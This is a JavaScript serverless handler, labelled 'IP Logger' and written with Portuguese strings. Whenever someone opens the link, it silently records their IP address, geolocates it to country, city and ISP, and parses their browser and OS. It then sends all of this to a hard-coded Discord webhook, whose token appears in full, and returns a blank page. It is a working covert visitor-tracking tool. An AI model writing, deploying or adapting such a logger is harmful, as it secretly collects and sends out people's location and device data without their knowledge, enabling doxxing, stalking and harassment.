export default async function handler(req, res) {
    const webhookUrl = "https://discord.com/api/webhooks/1377330816664731709/bl_oh9S8js6rhNgBNMmqSplQc7f__4dde322QGU-qSnq-VzQVvjQ_JwRjwDDQX2SDa6I";

    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;

    const geoRes = await fetch(`https://ipwho.is/${ip}`);
    const geoData = await geoRes.json();

    const country = geoData.country || "Desconhecido";
    const countryCode = geoData.country_code || "Desconhecido";
    const city = geoData.city || "Desconhecido";
    const region = geoData.region || "Desconhecido";
    const isp = geoData.connection?.isp || "Desconhecido";
    const domain = geoData.connection?.domain || "Desconhecido";

    const userAgent = req.headers["user-agent"] || "Desconhecido";

    // 🔍 Parser simples de User Agent
    function parseUserAgent(ua) {
        let browser = "Desconhecido";
        if (ua.includes("Chrome")) browser = "Chrome";
        else if (ua.includes("Firefox")) browser = "Firefox";
        else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
        else if (ua.includes("Edge")) browser = "Edge";
        else if (ua.includes("OPR") || ua.includes("Opera")) browser = "Opera";

        let os = "Desconhecido";
        if (ua.includes("Windows")) os = "Windows";
        else if (ua.includes("Android")) os = "Android";
        else if (ua.includes("iPhone")) os = "iOS";
        else if (ua.includes("Mac OS")) os = "Mac OS";
        else if (ua.includes("Linux")) os = "Linux";

        const device = ua.includes("Mobile") ? "Celular" : "Desktop";

        return { browser, os, device };
    }

    const { browser, os, device } = parseUserAgent(userAgent);

    const embed = {
        embeds: [
            {
                title: "🖥 Novo usuário acessou o site",
                color: 375295,
                description: `
**🌐 Informações de IP**
> **Endereço de IP:** \`${ip}\`
> **País:** ${country}
> **Código do País:** ${countryCode}
> **Cidade:** ${city}
> **Região:** ${region}
> **Provedor:** ${isp}
> **Domínio do Provedor:** \`${domain}\`

**🧠 Informações do Navegador**
> **User Agent:** \`${userAgent}\`
> **Navegador:** ${browser}
> **Sistema Operacional:** ${os}
> **Dispositivo:** ${device}
                `,
                footer: { text: "IP Logger" },
                timestamp: new Date().toISOString()
            }
        ]
    };

    await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(embed)
    });

    res.status(200).end();
}
